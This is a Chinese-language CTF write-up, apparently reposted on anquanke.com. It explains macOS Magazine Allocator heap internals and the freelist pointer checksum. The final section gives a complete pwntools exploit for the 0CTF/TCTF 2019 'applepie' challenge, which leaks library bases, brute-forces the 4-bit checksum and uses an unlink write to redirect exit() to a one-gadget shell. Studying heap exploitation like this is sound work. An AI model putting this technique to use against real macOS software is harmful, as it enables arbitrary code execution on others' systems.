@@ -1,0 +1,644 @@
+# MacOS上的堆利用
+
+阅读量 **257519**
+
+发布时间 : 2019-04-15 14:30:57
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 ChaMd5安全团队，文章来源： ChaMd5安全团队
+
+原文地址：[https://mp.weixin.qq.com/s?timestamp=1555292797&src=3&ver=1&signature=on5LP301rw1I6VdKUWDKN*5xJPijYxTSRFMKT8OalzwkDX*c5EylKaSk1Vo8*m8knUcVQubvDnX87JEb4fYtK9ehkp6sleX5XtgxL-DT8ciwxFQVsthC9BLsg09iC5nc-LtTmdMDx35iWUHHByBE*92I45UNY0Sv6CcLHS69TeE=](https://mp.weixin.qq.com/s?timestamp=1555292797&src=3&ver=1&signature=on5LP301rw1I6VdKUWDKN*5xJPijYxTSRFMKT8OalzwkDX*c5EylKaSk1Vo8*m8knUcVQubvDnX87JEb4fYtK9ehkp6sleX5XtgxL-DT8ciwxFQVsthC9BLsg09iC5nc-LtTmdMDx35iWUHHByBE*92I45UNY0Sv6CcLHS69TeE=)
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+**0CTF / TCTF2019**
+比赛时出了一道MacOS下的堆利用题目，这里以该题为背景介绍下MacOS下的堆利用攻击。前面主要详细介绍下MacOS系统的堆，如果想看利用可跳到后面的`applepie
+exp编写`介绍章节。
+
+## MacOS下的堆介绍
+
+MacOS高版本系统使用Magazine Allocator进行堆分配，低版本使用Scalable
+Allocator，详细结构这里不做介绍，它在分配时按照申请大小将堆分为三类 **tiny** , **small** , **large**  
+其中tiny&small用一个叫做 **Quantum ( Q )** 的单位管理
+
+  * **tiny** (Q = 16) ( **tiny** < 1009B )
+  * **small** (Q = 512) ( 1008B < **small** < 127KB )
+  * **large** ( 127KB < **large** )
+
+每个magazine有个cache区域可以用来快速分配释放堆
+
+###  堆的元数据(metadata)
+
+MacOS的堆分配方式和其他系统不同，没有采用`Linked
+List`方式的分配，堆的前后并没有带堆的元数据，而是将元数据存放在了其他地方，并且做了一系列措施方式防止堆溢出修改元数据。  
+每个进程包含3个区域，分别为 **tiny rack** , **small rack** , **large allocations**
+
+tiny rack | small rack | large allocations  
+---|---|---  
+magazine | magazine |  
+magazine | magazine |  
+magazine | magazine |  
+… | … |  
+magazine | magazine  
+  
+每个区域包含了多个活动可变的magazine区域  
+magazine中有n多个”Region”  
+这个叫”Region”的区域大小在tiny rack和small rack中是不同的，  
+“Region” in Tiny rack = 1MB  
+“Region” in Small rack = 8MB
+
+    
+    
+    tiny rack{
+        magazine 1 {
+            Region 1 {}
+            Region 2 {}
+            ...
+            Region n {}
+        }
+        magazine 2 {}
+        ...
+        magazine 3 {}
+    }
+    
+    small rack{
+        ...
+        magazine n {}
+        ...
+    }
+    
+
+“Region”中包含三样东西，一个是以 **Q** 为单位的内存block, 还有个是负责将各个”Region”关联起来的 **trailer**
+另外一个就是记录chunk信息的 **metadata**
+
+    
+    
+    tiny Region {
+        Q(1Q = 16) * 64520个
+        region_trailer_t trailer
+        metadata[64520/sizeof(uint32_t)] {
+            bitmaps[0]: uint32_t header = 描述哪个block是起始chunk
+            bitmaps[1]: uint32_t inuse = 描述chunk状态(busy/free)
+        }   
+    }
+    
+    Small Region {
+        Q(1Q = 512) * 16320个
+        region_trailer_t trailer
+        metadata[16320] {
+            bitmaps[0]: uint16_t msize = 最高一位描述chunk状态(busy/free), 其余位描述chunk的Q值（Q值代表与下一个chunk相差多少个Q）
+        }
+    }
+    
+
+large allocations保存在cache中，直接记录地址和大小，除非是分割严重，否则一般不会被unmmap
+
+    
+    
+    large {
+        address
+        size
+        did_madvise_reusable
+    }
+    
+
+###  堆的释放 – chunk本身的变化
+
+####  **tiny堆** ：
+
+> tiny堆在释放时，将该chunk挂在freelist上，这里和Linux类似
+
+比较有意思的一点是，tiny堆在释放时，会在chunk上 **写入元数据** ，我们值得关心的就是这一点
+
+    
+    
+        # -----------------------------------------------        # AAAAA....
+        #           
+        #                   ...AAA...  
+        #                                       .....AAAA
+        # -----------------------------------------------        #                       |
+        #                       | after free
+        #                       |
+        #                       ↓
+        # -----------------------------------------------        # checksum(prev_pointer) | checksum(next_pointer)
+        #           size         | ...
+        #                       ...
+        #                        | size
+        # -----------------------------------------------    
+
+这里有两个pointer和Linux上chunk的头极其相似，同样的，它们的作用也一样，在freelist上获取chunk时将会用这个pointer来进行链表的操作，还有chunk在free时，会进行合并检查，然后用这两个pointer进行unlink操作。  
+ ** _但是_**
+这里如果按照Linux的方式去攻击堆时，就会发现这里的checksum会阻止堆的元数据被溢出修改。`后面会大致介绍这里的checksum`
+
+关于tiny堆释放时的需要注意的另外一个点：
+
+    
+    
+    a1 = malloc(496)
+    a2 = malloc(496)
+    a3 = malloc(496)
+    free(a1)
+    free(a3)
+    #这里会发现a1, a3会的prev_pointer & next_pointer会正确的关联起来
+    free(a2)
+    #当a2也free之后，会发现a2, a3的头部被清空，a1头部的size却是三者之和，并且移动到small堆中
+    
+
+#### **small堆**
+
+small堆与tiny堆不同，释放后会先移动到cache中，等到下一个small堆被free时，当前的才会被移动到freelist中
+
+###  堆的释放 – chunk元数据(metadata)的变化
+
+####  mag_free_list
+
+这里便是要讲上文提到的freelist,`mag_free_list`是个负责存放地址的列表，一共包含32个元素，各个元素处储存着已经free的对应
+**Q** 值的chunk地址，前31个分别是从1Q~31Q的chunk freelist，第32个存放比31Q还要大的chunk freelist。  
+当新的chunk被free时，将按照chunk的大小，存放在对应Q值的freelist上，并按照双向链表设置好checksum(prev_pointer),
+checksum(next_pointer) {参照Linux的freelist}
+
+####  mag_free_bit_map
+
+这个则如名字所示，按位来标记Q(n)是否具有freelist
+
+###  堆的释放 – checksum
+
+程序在运行时，都会随机生成一个cookie，这个cookie会pointer进行下面的计算生成一个checksum, 然后将(checksum << 56
+) | (pointer >> 4)运算后将checksum保存在高位上，以便检测堆的元数据是否被溢出破坏
+
+    
+    
+    static MALLOC_INLINE uintptr_t
+    free_list_checksum_ptr(rack_t *rack, void *ptr)
+    {
+        uintptr_t p = (uintptr_t)ptr;
+        return (p >> NYBBLE) | ((free_list_gen_checksum(p ^ rack->cookie) & (uintptr_t)0xF) << ANTI_NYBBLE); // compiles to rotate instruction
+    }
+    
+    static MALLOC_INLINE void *
+    free_list_unchecksum_ptr(rack_t *rack, inplace_union *ptr)
+    {
+        inplace_union p;
+        uintptr_t t = ptr->u;
+    
+        t = (t << NYBBLE) | (t >> ANTI_NYBBLE); // compiles to rotate instruction
+        p.u = t & ~(uintptr_t)0xF;
+    
+        if ((t ^ free_list_gen_checksum(p.u ^ rack->cookie)) & (uintptr_t)0xF) {
+            free_list_checksum_botch(rack, ptr, (void *)ptr->u);
+            __builtin_trap();
+        }
+        return p.p;
+    }
+    static MALLOC_INLINE uintptr_t
+    free_list_gen_checksum(uintptr_t ptr)
+    {
+        uint8_t chk;
+    
+        chk = (unsigned char)(ptr >> 0);
+        chk += (unsigned char)(ptr >> 8);
+        chk += (unsigned char)(ptr >> 16);
+        chk += (unsigned char)(ptr >> 24);
+    #if __LP64__
+        chk += (unsigned char)(ptr >> 32);
+        chk += (unsigned char)(ptr >> 40);
+        chk += (unsigned char)(ptr >> 48);
+        chk += (unsigned char)(ptr >> 56);
+    #endif
+    
+        return chk;
+    }
+    
+
+###  magazine_t
+
+这个则包含了上述介绍过的各种数据，比如chunk cache, 以及mag_free_bit_map, mag_free_list,
+以及最后一个被使用的region, 以及所有region的链表
+
+    
+    
+    struct magazine_t {
+        ...
+        void *mag_last_free;
+        unsigned[8] mag_bitmap;
+        free_list_t*[256] mag_free_list;
+        region_t mag_last_region;
+        region_trailer_t *firstNode, *lastNode;
+        ...
+    }
+    
+
+###  堆的申请
+
+整个申请流程是首先从cache中寻找是否有对应的堆，如果没有接着从freelist中寻找，没找到再从region中去申请
+
+## 题目攻击思路
+
+首先题目保护全开，具有PIE，再分析程序流程。  
+程序整个流程就是以下面的结构体进行堆数据操作。
+
+    
+    
+    struct mem {
+        int StyleTableIndex
+        int ShapeTableIndex
+        int Time
+        int NameSize
+        char *NameMem
+    }
+    
+
+  * 溢出
+
+发现在update()更新mem时，可以随意设定当前mem->nameSize的大小，导致修改name时，可溢出修改name后的下一块mem的数据。  
+但是修改的size发现做了限制，导致数据溢出最大只能修改到mem结构的前三项  
+mem->StyleTableIndex  
+mem->ShapeTableIndex  
+mem->Time
+
+![](https://p5.ssl.qhimg.com/t01949703677dc219ca.png)
+
+  * leak
+
+在show()显示时，可以用StyleTable[offset/8]来leak数据
+
+因为有PIE的存在，程序每次运行堆栈地址都会随机，所以整个利用思路就是先leak
+libsystem_c.dylib的地址，接着利用heap操作产生的漏洞去将包含的execv(‘/bin/sh’)代码运行地址写入可以劫持到程序流程的地方。
+
+###  利用MacOS堆的特性leak libsystem_c.dylib
+
+查看程序运行时的vmmap，可以看到程序下方有个Malloc metadata的region，这里开头存放的就是DefaultZone
+
+![](https://p1.ssl.qhimg.com/t013e026fa5162d8b77.png)
+
+我们可以看下libmalloc的源代码
+
+    
+    
+    typedef struct _malloc_zone_t {
+        /* Only zone implementors should depend on the layout of this structure;
+        Regular callers should use the access functions below */
+        void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */
+        void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */
+        size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */
+        void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);
+        void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */
+        void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */
+        void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);
+        void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);
+        void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */
+        const char    *zone_name;
+    
+        /* Optional batch callbacks; these may be NULL */
+        unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */
+        void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */
+    
+        struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);
+        unsigned    version;
+    
+        /* aligned memory allocation. The callback may be NULL. Present in version >= 5. */
+        void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);
+    
+        /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version >= 6.*/
+        void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);
+    
+        /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version >= 8. */
+        size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);
+    
+        /*
+         * Checks whether an address might belong to the zone. May be NULL. Present in version >= 10.
+         * False positives are allowed (e.g. the pointer was freed, or it's in zone space that has
+         * not yet been allocated. False negatives are not allowed.
+         */
+        boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);
+    } malloc_zone_t;
+    
+
+值得我们仔细关注的是这里的  
+`struct malloc_introspection_t * MALLOC_INTROSPECT_TBL_PTR(introspect);`
+
+继续查看源代码
+
+    
+    
+    typedef struct malloc_introspection_t {
+        kern_return_t (* MALLOC_INTROSPECT_FN_PTR(enumerator))(task_t task, void *, unsigned type_mask, vm_address_t zone_address, memory_reader_t reader, vm_range_recorder_t recorder); /* enumerates all the malloc pointers in use */
+        size_t    (* MALLOC_INTROSPECT_FN_PTR(good_size))(malloc_zone_t *zone, size_t size);
+        ...
+    }
+    
+
+用之前介绍过的堆资料，可以知道  
+所以DefaultZone->introspect->enumerator这里储存了enumerator对应的函数`szone_ptr_in_use_enumerator`的地址
+
+####  libsystem_malloc.dylib地址
+
+所以  
+libsystem_malloc.dylib的地址 = leak出的`szone_ptr_in_use_enumerator地址 -sznoe偏移量(0x0000000000013D68)`
+
+####  libsystem_c.dylib地址
+
+这里有个很有趣的现象，就是MacOS的PIE会保证程序每次运行时都会随机堆栈以及加载地址，但是引入的动态库地址不会产生变化，似乎只会在开机时变化。  
+所以可以看下vmmap，确定下libsystem_c.dylib与libsystem_malloc.dylib加载地址，得到偏移量。  
+`libsystem_c.dylib = libsystem_malloc.dylib - 偏移量(0x161000)`
+
+###  OneGadget RCE
+
+分析了libsystem_c.dylib,发现了与Linux libc中同样的execv(‘/bin/sh’)代码片段  
+`onegadget rce = libsystem_c.dylib + 0x0000000000025D94`
+
+![](https://p2.ssl.qhimg.com/t01dfcae43b6fe13a59.png)
+
+###  劫持程序流 – 前置
+
+这里利用MachO的Lazy
+Bind机制，复写libsystem_c.dylib的la_symbol_ptr表中的函数存放地址（不写原程序的原因是无法leak原程序加载地址）  
+查看一周发现最优的选择为`exit_la_symbol_ptr`  
+我们可以在add()函数阶段输入不被认可的Size，可让程序执行exit()进而执行我们写入的地址。
+
+这里发现libsystem_c.dylib的TEXT和DATA
+region地址相差较大，不像原程序紧挨在一起，所以这里还需要再leak一次libsystem_c.dylibd的DATA region地址。
+
+####  libsystem_c.dylib DATA
+
+分析原程序时发现在`.got`内有个`FILE **__stdinp_ptr`  
+可以看到开头的_p指向了某块内存的地址，这样就可以利用这个来完成leak DATA地址,这里buffer与DATA起始地址的偏移量分析下就可以得到
+
+`libsystem_c_DATA = libsystem_c_stdinptr - 0x4110`
+
+    
+    
+    typedef    struct __sFILE {
+        unsigned char *_p;    /* current position in (some) buffer */
+        int    _r;        /* read space left for getc() */
+        int    _w;        /* write space left for putc() */
+        short    _flags;        /* flags, below; this FILE is free if 0 */
+        short    _file;        /* fileno, if Unix descriptor, else -1 */
+        struct    __sbuf _bf;    /* the buffer (at least 1 byte, if !NULL) */
+        int    _lbfsize;    /* 0 or -_bf._size, for inline putc */
+    
+        /* operations */
+        void    *_cookie;    /* cookie passed to io functions */
+        int    (*_close)(void *);
+        int    (*_read) (void *, char *, int);
+        fpos_t    (*_seek) (void *, fpos_t, int);
+        int    (*_write)(void *, const char *, int);
+    
+        /* separate buffer for long sequences of ungetc() */
+        struct    __sbuf _ub;    /* ungetc buffer */
+        struct __sFILEX *_extra; /* additions to FILE to not break ABI */
+        int    _ur;        /* saved _r when _r is counting ungetc data */
+    
+        /* tricks to meet minimum requirements even when malloc() fails */
+        unsigned char _ubuf[3];    /* guarantee an ungetc() buffer */
+        unsigned char _nbuf[1];    /* guarantee a getc() buffer */
+    
+        /* separate buffer for fgetln() when line crosses buffer boundary */
+        struct    __sbuf _lb;    /* buffer for fgetln() */
+    
+        /* Unix stdio files get aligned to block boundaries on fseek() */
+        int    _blksize;    /* stat.st_blksize (may be != _bf._size) */
+        fpos_t    _offset;    /* current lseek offset (see WARNING) */
+    } FILE;
+    
+
+###  劫持程序流 – 核心
+
+根据前面堆的申请介绍，我们可以构造一些tiny堆，让再次申请堆时保证从freelist上获取，然后完成tiny_malloc_from_free_list()，使内部的unlink操作完成`next->previous
+= ptr->previous`任意数据写任意地址的操作
+
+但是这里有个问题，就是在unlink前，会有个unchecksum的检查，因为程序每次运行时，都会对当前的zone生成随机的cookie，导致这里无法绕过去
+
+    
+    
+    next = free_list_unchecksum_ptr(rack, &ptr->next);
+    
+    
+    
+    free_list_gen_checksum(uintptr_t ptr)
+    {
+        uint8_t chk;
+        chk = (unsigned char)(ptr >> 0);
+        chk += (unsigned char)(ptr >> 8);
+        chk += (unsigned char)(ptr >> 16);
+        chk += (unsigned char)(ptr >> 24);
+    #if __LP64__
+        chk += (unsigned char)(ptr >> 32);
+        chk += (unsigned char)(ptr >> 40);
+        chk += (unsigned char)(ptr >> 48);
+        chk += (unsigned char)(ptr >> 56);
+    #endif
+        return chk;
+    }
+    
+    static MALLOC_INLINE uintptr_t  free_list_checksum_ptr(rack_t *rack, void *ptr)
+    {
+        uintptr_t p = (uintptr_t)ptr;
+        return (p >> NYBBLE) | ((free_list_gen_checksum(p ^ rack->cookie) & (uintptr_t)0xF) << ANTI_NYBBLE); // compiles to rotate instruction
+    }
+    
+
+但万幸的是MacOS在对生成的cookie和pointer进行checksum后，只使用了4个有效位来保存checksum值，所以可以设定个checksum进行爆破，让程序生成的cookie在与我们的pointer在checksum后恰好等于我们自己设定的值。
+
+`value = p64(((libsystem_c_exit_la_symbol_ptr >> 4) | int(checksum, 16)))`
+
+## getshell
+
+下面是完整的exp
+
+    
+    
+    #!/usr/bin/python2.7
+    # -*- coding: utf-8 -*-    
+    
+    from pwn import *
+    #import monkeyhex
+    from binascii import *
+    import socket
+    import sys
+    
+    
+    def main(checksum, localFlag):
+        if localFlag == 1:
+            p = process('./applepie')
+        elif localFlag == 2:
+            p = remote('127.0.0.1', 10007)
+        elif localFlag == 3:
+            p = remote('111.186.63.147', 6666)
+        # context.log_level = 'debug'
+        context.terminal = ['tmux', 'split', '-h']
+    
+        def add(style,shape,size,name):
+            p.recvuntil('Choice: ')
+            p.sendline('1')
+            p.recvuntil(':')
+            p.sendline(str(style))
+            p.recvuntil(':')
+            p.sendline(str(shape))
+            p.recvuntil(':')
+            p.sendline(str(size))
+            p.recvuntil(':')
+            p.sendline(name)
+    
+        def show(id):
+            p.recvuntil('Choice:' )
+            p.sendline('2')
+            p.recvuntil(':')
+            p.sendline(str(id))
+    
+        def update(id,style,shape,size,name):
+            p.recvuntil('Choice: ')
+            p.sendline('3')
+            p.recvuntil(':')
+            p.sendline(str(id))
+            p.recvuntil(':')
+            p.sendline(str(style))
+            p.recvuntil(':')
+            p.sendline(str(shape))
+            p.recvuntil('Size: ')
+            p.sendline(str(size))
+            p.recvuntil(':')
+            p.sendline(name)
+    
+        def free(id):
+            p.recvuntil('Choice:')
+            p.sendline('4')
+            p.recvuntil(':')
+            p.sendline(str(id))
+    
+        id0 = add(1, 1, 0x40, 'aaa')
+        id1 = add(1, 1, 0x40, 'aaa')
+    
+        # 溢出修改styleTable数组的index，完成leak Default Zone struct的introspect保存的enumerator，可以用来leak libsystem_malloc.dylib
+        # libsystem_malloc.dylib`szone_ptr_in_use_enumerator:
+        #     0x7fff68161d68 <+0>:  push   rbp
+        #     0x7fff68161d69 <+1>:  mov    rbp, rsp
+        update(0, 1, 1, 0x50, 'a'*0x40 + p64(0x3fc0/8))
+        show(1)
+        p.recvuntil('Style: ')
+        szone_ptr_in_use_enumerator = u64(p.recvuntil('n')[:-1].ljust(8, 'x00'))
+        log.info_once('szone_ptr_in_use_enumerator = ' + hex(szone_ptr_in_use_enumerator))
+    
+        # szone_ptr_in_use_enumerator函数在libsystem_malloc.dylib中的地址0x0000000000013D68 
+        libsystem_malloc_baseImage = szone_ptr_in_use_enumerator - 0x0000000000013D68
+        # Mac PIE的特殊性，程序本身每次运行全随机化，但动态库只有在开机时才会随机一次，此后位置都为固定
+        libsystem_c_baseImage = libsystem_malloc_baseImage - 0x161000
+        onegadget_rce = libsystem_c_baseImage + 0x0000000000025D94
+    #    libsystem_c_exit_la_symbol_ptr = libsystem_c_baseImage + 0x8a0b0
+        log.info_once('libsystem_malloc.dylib = ' + hex(libsystem_malloc_baseImage))
+        log.info_once('libsystem_c.dylib = ' + hex(libsystem_c_baseImage))
+        log.info_once('libsystem_c.dylib: onegadget rce = ' + hex(onegadget_rce))
+    #    log.info('libsystem_c.dylib: exit->la_symbol_ptr = ' + hex(libsystem_c_exit_la_symbol_ptr))
+    #   发现libsyste_c.dylib等动态库DATA与TEXT段分离较远（vmmap）,所以先leak libsystem_c.dylib的DATA段
+    
+    
+        update(0, 1, 1, 0x50, 'a'*0x40 + p64(0xffffffffffffff78/8))
+        show(1)
+        p.recvuntil('Style: ')
+        libsystem_c_stdinptr = u64(p.recvuntil('n')[:-1].ljust(8, 'x00'))
+        log.info_once('FILE *stdinp->p: ' + hex(libsystem_c_stdinptr))
+        libsystem_c_DATA = libsystem_c_stdinptr - 0x4110
+        log.info_once('libsystem_c.dylib: DATA seg = ' + hex(libsystem_c_DATA))
+        libsystem_c_exit_la_symbol_ptr = libsystem_c_DATA + 0xb0
+        log.info_once('libsystem_c.dylib: exit->la_symbol_ptr = ' + hex(libsystem_c_exit_la_symbol_ptr))
+    
+    
+        # 接着步骤为
+        id2 = add(1, 1, 0x40, 'aaa')
+        id3 = add(1, 1, 0x40, 'aaa') # free
+        id4 = add(1, 1, 0x40, 'aaa') # -----> 更改这个堆，溢出修改到下一个free块id5
+        id5 = add(1, 1, 0x40, 'aaa') # free
+        id6 = add(1, 1, 0x40, 'aaa')
+        id7 = add(1, 1, 0x40, 'aaa') # free
+        id8 = add(1, 1, 0x40, 'aaa')
+    
+        # 释放id3,将其挂在freelist上
+        free(3)
+        free(5)
+        free(7)
+        # 更新块id2时，溢出修改前面释放的id3块上的元数据头
+        # -----------------------------        # prev_pointer | next_pointer
+        # size         | ...
+        # ...
+        #              | size
+        # -----------------------------        # 
+        # 然后下次malloc时，会从freelist上获取之前free的id3
+    
+        value = p64(((libsystem_c_exit_la_symbol_ptr >> 4) | int(checksum, 16)))
+        log.info_once('after checksum(ptr): ' + hex(u64(value)))
+        id7 = add(1, 1, 0x40, 'aaa')
+        update(4, 1, 1, 0x50, 'a'*0x40 + p64(onegadget_rce) + value)
+    
+    
+        # malloc申请内存，完成unlink操作, 将onegadget_rce写入libsystem_c_exit_la_symbol_ptr
+        p.recvuntil('Choice: ')
+        p.recvuntil('Choice: ')
+        p.sendline('1') # add
+        try:
+            res = p.recv() # recvice 'Error'
+            if res.find('malloc') > 0:
+                log.failure('error checksum: ' + res)
+                return
+            else:
+                log.success('!!! currect checksum(' + hex(libsystem_c_exit_la_symbol_ptr) + '): ' + hex(u64(value)))
+            p.sendline('1') # Style
+            p.recvuntil('Choice: ')
+            p.sendline('1') # Shape
+            p.recvuntil('Size: ')
+            p.sendline('9999') # 输入错误Size让程序去执行exit()流程
+            p.recv() # 'Error'
+            p.sendline('uname')
+            res = p.recvuntil('Darwin')
+            log.info(res)
+        except:
+            return
+    
+        p.interactive() # 这里getshell后就可以退出了
+        if res.find('Darwin') >= 0:
+            sys.exit()
+    
+    
+    for i in range(0x00, 0x23):
+        checksum = '0x'+'{:016x}'.format(0x23<<56)
+        main(checksum, 1)
+    
+
+![](https://p5.ssl.qhimg.com/t01e6b5c942df60d53f.png)
+
+本文翻译自 ChaMd5安全团队
+[原文链接](https://mp.weixin.qq.com/s?timestamp=1555292797&src=3&ver=1&signature=on5LP301rw1I6VdKUWDKN*5xJPijYxTSRFMKT8OalzwkDX*c5EylKaSk1Vo8*m8knUcVQubvDnX87JEb4fYtK9ehkp6sleX5XtgxL-DT8ciwxFQVsthC9BLsg09iC5nc-LtTmdMDx35iWUHHByBE*92I45UNY0Sv6CcLHS69TeE=)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **hook** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/176368](/post/id/176368)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [
+ChaMd5安全团队](https://mp.weixin.qq.com/s?timestamp=1555292797&src=3&ver=1&signature=on5LP301rw1I6VdKUWDKN*5xJPijYxTSRFMKT8OalzwkDX*c5EylKaSk1Vo8*m8knUcVQubvDnX87JEb4fYtK9ehkp6sleX5XtgxL-DT8ciwxFQVsthC9BLsg09iC5nc-LtTmdMDx35iWUHHByBE*92I45UNY0Sv6CcLHS69TeE=)
+
+如若转载,请注明出处：
+[https://mp.weixin.qq.com/s?timestamp=1555292797&src=3&ver=1&signature=on5LP301rw1I6VdKUWDKN*5xJPijYxTSRFMKT8OalzwkDX*c5EylKaSk1Vo8*m8knUcVQubvDnX87JEb4fYtK9ehkp6sleX5XtgxL-DT8ciwxFQVsthC9BLsg09iC5nc-LtTmdMDx35iWUHHByBE*92I45UNY0Sv6CcLHS69TeE=](https://mp.weixin.qq.com/s?timestamp=1555292797&src=3&ver=1&signature=on5LP301rw1I6VdKUWDKN*5xJPijYxTSRFMKT8OalzwkDX*c5EylKaSk1Vo8*m8knUcVQubvDnX87JEb4fYtK9ehkp6sleX5XtgxL-DT8ciwxFQVsthC9BLsg09iC5nc-LtTmdMDx35iWUHHByBE*92I45UNY0Sv6CcLHS69TeE=)
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [macOS](/tag/macOS)
+  * [CTF](/tag/CTF)
+
+ **+1** __4赞
+
+ __收藏
+
+![](https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTLlPTaIMxhBwJVicPoa1Hwdic35s43MXeTgCcmNicN8iciaLK6z0WdalXcaNgMUDf2rKP5z5gWlfGjwHSQ/132)
+hook
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
